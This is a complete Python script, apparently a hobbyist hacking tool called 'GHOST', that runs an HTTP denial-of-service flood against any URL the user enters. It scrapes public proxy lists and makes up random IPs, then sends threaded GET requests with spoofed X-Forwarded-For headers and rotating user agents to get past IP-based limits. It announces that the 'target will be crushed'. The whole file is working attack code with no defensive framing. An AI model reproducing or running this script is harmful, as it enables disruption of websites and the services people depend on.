import os
import sys
import random
import re
import string
import time
import threading
import requests

os.system('title GHOST MADE BY Root')

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/16.1 Safari/605.1.15",
]

proxy_sources = [
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/proxies.txt",
    "https://raw.githubusercontent.com/hendrikbgr/Free-Proxy-List/main/proxies.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
    "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/HTTP.txt",
    "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/http.txt",
    "https://raw.githubusercontent.com/ProxyScraper/ProxyScraper/main/http.txt",
    "https://raw.githubusercontent.com/HyperBeats/proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/userxd001/proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
    "https://raw.githubusercontent.com/ProxyScraper/ProxyScraper/main/socks4.txt",
    "https://raw.githubusercontent.com/ProxyScraper/ProxyScraper/main/socks5.txt",
    "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS4.txt",
    "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS5.txt",
    "https://raw.githubusercontent.com/HyperBeats/proxy-list/main/socks4.txt",
    "https://raw.githubusercontent.com/HyperBeats/proxy-list/main/socks5.txt",
    "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/socks4.txt",
    "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/socks5.txt",
]

def fetch_ips_from_url(url):
    try:
        r = requests.get(url, timeout=8)
        ips = re.findall(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b", r.text)
        return ips
    except:
        return []

def get_all_ips():
    all_ips = []
    print("[+] Fetching IPs from proxy sources...")
    for url in proxy_sources:
        ips = fetch_ips_from_url(url)
        all_ips.extend(ips)
        if ips:
            print(f"    Fetched {len(ips)} IPs")
    for _ in range(500):
        all_ips.append(f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}")
    return list(set(all_ips))

def send_request(target_url, ip, request_id):
    headers = {
        "User-Agent": random.choice(user_agents),
        "X-Forwarded-For": ip,
        "X-Real-IP": ip,
        "Accept": random.choice(["text/html", "application/json", "text/plain", "*/*"]),
        "Accept-Language": random.choice(["en-US", "pl-PL", "de-DE", "fr-FR", "es-ES", "it-IT"]),
        "Cache-Control": "no-cache",
        "Connection": "close",
        "X-Request-ID": ''.join(random.choices(string.ascii_letters + string.digits, k=16)),
        "Referer": random.choice(["https://google.com", "https://bing.com", "https://yahoo.com", target_url]),
    }
    try:
        r = requests.get(target_url, headers=headers, timeout=3)
        print(f"[{request_id}] k33ly@root -> {target_url} | IP: {ip} | Status: {r.status_code}")
        return True
    except:
        print(f"[{request_id}] k33ly@root -> {target_url} | IP: {ip} | FAILED")
        return False

def attack_worker(target_url, ip_list, num_requests, worker_id):
    success = 0
    fail = 0
    for i in range(num_requests):
        ip = random.choice(ip_list)
        if send_request(target_url, ip, f"W{worker_id}-{i}"):
            success += 1
        else:
            fail += 1
    print(f"[Worker {worker_id}] Done: {success} success, {fail} failed")

def run_attack(target_url, total_requests, max_workers=50):
    print("\n[+] Fetching IP addresses...")
    ip_list = get_all_ips()
    if not ip_list:
        print("[!] No IPs found, generating random ones...")
        ip_list = [f"10.0.{random.randint(0,255)}.{random.randint(0,255)}" for _ in range(1000)]
    print(f"[+] Loaded {len(ip_list)} unique IPs")
    
    requests_per_worker = max(1, total_requests // max_workers)
    extra = total_requests % max_workers
    
    print(f"[+] Starting attack: {total_requests} requests, {max_workers} workers\n")
    
    threads = []
    for i in range(max_workers):
        req_count = requests_per_worker + (1 if i < extra else 0)
        t = threading.Thread(target=attack_worker, args=(target_url, ip_list, req_count, i))
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()
    
    print(f"\n[+] Attack finished! Total: {total_requests} requests sent.")

def print_banner():
    banner = """
         ⢀⣤⡶⠶⠛⠛⠛⠛⠻⠶⢶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣠⡾⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠳⣦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⡾⠋⢠⠀⠀⠀⠀⠀⠀⣠⠄⠀⠀⠀⠀⠀⠀⠈⠻⣦⠀⠀⠀⠀⠀
⠀⠀⠀⢠⡿⠁⠀⣸⡦⠾⢦⣤⡴⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣧⠀⠀⠀⠀
⣾⠛⠳⣾⠁⠀⠀⠿⠃⠀⢸⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣇⠀⠀⠀
⢻⡀⢸⡇⠀⡆⠀⠀⠀⠀⣀⣤⠴⢶⡆⠀⠀⠀⢀⣤⠖⠛⠉⠉⡷⠀⢿⡀⠀⠀
⠈⢷⣼⠃⠀⣿⠒⣶⢻⡏⣿⡀⠀⣿⡇⠀⠀⠀⠋⠀⠀⠀⢀⡼⠃⠀⢸⡇⠀⠀
⠀⠈⣿⠀⠀⢹⡀⣿⣾⠿⠛⢷⣸⢣⡇⠀⠀⠀⠀⠀⢀⣴⠟⠁⠀⠀⢸⡇⠀⠀
⠀⠀⢹⡆⠀⢸⣿⣿⠁⠀⠀⠀⠁⢸⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀
⠀⠀⠸⣇⠀⠈⢿⡇⠀⠀⠀⠀⠀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠓⠒⣶
⠀⠀⠀⢻⡄⠀⠘⣧⠀⠀⠀⠀⣸⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠋
⠀⠀⠀⠀⠻⣆⠀⠈⠳⢦⣤⠾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⡴⠛⠀⠀
⠀⠀⠀⠀⠀⠈⠳⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⠶⠛⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠶⢦⣤⣤⣤⣤⣤⡴⠶⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀
                                                                    BY : root
"""
    print(banner)

if __name__ == "__main__":
    print_banner()
    print("")
    target_url = input("Enter Target URL (with http:// or https://): ")
    try:
        num_requests = int(input("Enter Number of Requests: "))
    except ValueError:
        print("Error: Number must be an integer!")
        sys.exit(1)
    
    if not target_url or num_requests <= 0:
        print("Error: Invalid URL or request count!")
        sys.exit(1)
    
    print("\n[+] DoS attack started. Target will be crushed!\n")
    run_attack(target_url, num_requests)